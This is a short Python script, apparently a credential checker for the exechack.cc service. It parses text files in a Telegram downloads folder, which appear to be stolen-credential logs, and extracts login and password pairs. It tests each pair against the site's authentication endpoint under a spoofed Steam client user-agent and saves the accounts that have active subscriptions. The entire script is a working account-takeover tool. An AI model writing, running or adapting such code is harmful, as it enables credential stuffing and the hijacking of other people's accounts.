import os
import requests as req
from colorama import Fore

def main(folder_logs,log_file):
    with open(f"{folder_logs}/{log_file}","r",encoding="utf-8") as content_file:
        print(Fore.CYAN + f"Working as {log_file}")
        lines = content_file.readlines()
        for line in lines:
            if "exechack.cc" in line:
                line = line.replace("/",":").replace("|",":").split(":")
                login = line[-2]
                password = line[-1].replace("\n","")

                r = req.post("https://exechack.cc/forum/authq.php",
                data={
                    "password": f"{password}",
                    "username": f"{login}",
                    "hwid": "{execlox}",
                    "gay": "no"
                },
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    "user-agent": "Valve/Steam HTTP Client 1.0 (4000)",
                    "accept-charset": "ISO-8859-1,utf-8,*;q=0.7",
                    "Accept-Encoding": "identity",
                })
                if r.text not in ["Account not found","Subscription not found"]:
                    print(Fore.GREEN + f"[Account with subscription was found] {login}:{password} - {r.text}")

                    with open("validate_acces.txt","a",encoding="utf-8") as validate:
                        validate.write(f"{login}:{password}\n")
                else:
                    continue

if __name__ == "__main__":
    folder = "C:/Users/Computer/Downloads/Telegram Desktop"
    try:
        print("Exechack checker / Version: 27052025\n"
              "github: https://github.com/Fae1337/exechack-checker\n")
        for file in os.listdir(folder):
            if file.endswith(".txt"):
                main(folder,file)
        else:
            print(Fore.WHITE + "\nend")

    except FileNotFoundError:
        print(f"Folder {folder} with log {Fore.RED + "Not Found"}")
